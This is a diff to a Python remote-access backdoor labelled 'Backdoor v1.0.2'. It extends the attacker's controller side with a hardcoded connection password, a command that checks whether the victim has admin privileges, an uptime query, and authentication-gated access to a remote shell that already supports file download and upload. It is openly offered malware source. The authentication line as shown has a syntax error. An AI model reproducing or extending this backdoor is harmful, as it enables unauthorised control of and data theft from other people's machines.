@@ -2,7 +2,7 @@
 # ipconfig /all | findstr /I ipv4
 # Testet in: Python 3.8.8
 # By: LawlietJH
-# Backdoor v1.0.1
+# Backdoor v1.0.2
 
 import atexit
 import socket
@@ -10,7 +10,9 @@ import base64
 import sys
 import os
 
-
+#=======================================================================
+#=======================================================================
+#=======================================================================
 
 class Server:
 	
@@ -24,6 +26,8 @@ class Server:
 		self.LPORT  = LPORT
 		self.LOCAL  = (self.LHOST, self.LPORT)
 		self.sc_count = 0
+		self.passwd = 'Z10N'
+		self.connect = False
 		# ~ self.fs_encoding = sys.getfilesystemencoding()
 		
 		if not download_path.endswith('/'): download_path+='/'
@@ -39,6 +43,7 @@ class Server:
 		self.CLS  = ('cls', 'clear')
 		self.DOWNLOAD = ('download', 'dl')
 		self.UPLOAD   = ('upload', 'ul')
+		self.IS_ADMIN = ('isadmin', 'isuseranadmin', 'amianadmin','privileges')
 	
 	def latin1_encoding(self, res):
 		
@@ -173,7 +178,7 @@ class Server:
 			
 			try:
 				self.client.send('alive'.encode())
-				self.client.recv(2)
+				self.client.recv(16)
 			except ConnectionAbortedError:
 				sys.exit()
 			
@@ -324,6 +329,17 @@ class Server:
 				print()
 				self.client.send('cls'.encode())
 				self.client.recv(2)
+			elif command.lower().startswith('activetime'):
+				self.client.send(command.encode())
+				res = self.client.recv(1024).decode('utf-8', 'ignore')
+				print('\n [+] Tiempo total activo del sistema: ' + res + '\n')
+			elif command.lower() in self.IS_ADMIN:
+				self.client.send(self.IS_ADMIN[0].encode())
+				res = self.client.recv(1024).decode('utf-8', 'ignore')
+				if res == 'ok':
+					print('\n [+] Tienes permisos de administrador\n')
+				else:
+					print('\n [-] NO tienes permisos de administrador\n')
 			elif not command: pass
 			else:
 				self.client.send(command.encode())
@@ -354,6 +370,13 @@ class Server:
 		self.client, self.IP = self.server.accept()
 		
 		print('\n [+] Conexión recibida de:', self.IP[0], '\n')
+		print('\n [+] Validando conexión:', end=' ')
+		
+		if self.client.recv(64) = self.passwd:
+			self.client.send('ok'.encode())
+			self.connect = True
+		else:
+			self.client.send('error'.encode())
 
 
 
@@ -374,7 +397,7 @@ if __name__ == '__main__':
 	
 	server = Server(LHOST, LPORT)
 	server.up()
-	server.shell()
+	if server.connect: server.shell()
 	server.server.close()
 
 
